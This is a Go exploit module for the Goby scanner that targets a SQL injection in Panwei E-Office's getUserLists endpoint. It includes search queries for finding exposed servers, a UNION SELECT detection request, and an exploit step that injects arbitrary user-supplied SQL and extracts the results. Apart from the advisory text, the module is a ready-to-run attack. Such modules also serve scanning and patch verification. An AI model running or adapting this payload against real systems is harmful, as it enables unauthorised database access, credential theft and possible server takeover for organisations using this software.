package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "E-Office getUserLists SQL Injection vulnerability",
    "Description": "<p>Panwei e-officeOA system is a professional collaborative OA software for small and medium-sized organizations. It is a leading brand in the domestic collaborative OA office field. It is committed to providing enterprise users with professional OA office systems, mobile OA applications and other collaborative OA overall solutions.Because getUserLists does not perform user permission judgment and does not filter user input parameters, a SQL injection vulnerability is caused.</p>",
    "Product": "E-Office",
    "Homepage": "https://www.e-office.cn/",
    "DisclosureDate": "2022-06-09",
    "Author": "gh0stz1@qq.com",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>Update to the latest version.Official patch link:<a href=\"http://v10.e-office.cn/9safepack/%E6%B3%9B%E5%BE%AEe-office9.5%2020211226%E8%A1%A5%E4%B8%81%E7%A8%8B%E5%BA%8F.zip\">http://v10.e-office.cn/9safepack/%E6%B3%9B%E5%BE%AEe-office9.5%2020211226%E8%A1%A5%E4%B8%81%E7%A8%8B%E5%BA%8F.zip</a></p>",
    "References": [
        "http://fofa.so"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "SQL",
            "type": "input",
            "value": "concat(database())",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/E-mobile/App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(123))--",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/E-mobile/App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,({{{SQL}}})--",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(\"PRIV_NAME\":\".*\"}])"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office 9.5 getUserLists SQL 注入漏洞",
            "Product": "泛微 E-office",
            "Description": "<p>泛微e-officeOA系统是面向中小型组织的专业协同OA软件，国内协同OA办公领域领导品牌，致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。由于getUserLists没有进行用户权限判断且对用户输入参数没有过滤造成了SQL注入漏洞。<br></p>",
            "Recommendation": "<p>更新到最新版本 官方补丁链接<a href=\"http://v10.e-office.cn/9safepack/%E6%B3%9B%E5%BE%AEe-office9.5%2020211226%E8%A1%A5%E4%B8%81%E7%A8%8B%E5%BA%8F.zip\">http://v10.e-office.cn/9safepack/%E6%B3%9B%E5%BE%AEe-office9.5%2020211226%E8%A1%A5%E4%B8%81%E7%A8%8B%E5%BA%8F.zip</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "E-Office getUserLists SQL Injection vulnerability",
            "Product": "E-Office",
            "Description": "<p>Panwei e-officeOA system is a professional collaborative OA software for small and medium-sized organizations. It is a leading brand in the domestic collaborative OA office field. It is committed to providing enterprise users with professional OA office systems, mobile OA applications and other collaborative OA overall solutions.<span style=\"color: var(--primaryFont-color);\">Because getUserLists does not perform user permission judgment and does not filter user input parameters, a SQL injection vulnerability is caused.</span></p>",
            "Recommendation": "<p>Update to the latest version.Official patch link:<a href=\"http://v10.e-office.cn/9safepack/%E6%B3%9B%E5%BE%AEe-office9.5%2020211226%E8%A1%A5%E4%B8%81%E7%A8%8B%E5%BA%8F.zip\">http://v10.e-office.cn/9safepack/%E6%B3%9B%E5%BE%AEe-office9.5%2020211226%E8%A1%A5%E4%B8%81%E7%A8%8B%E5%BA%8F.zip</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10685"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}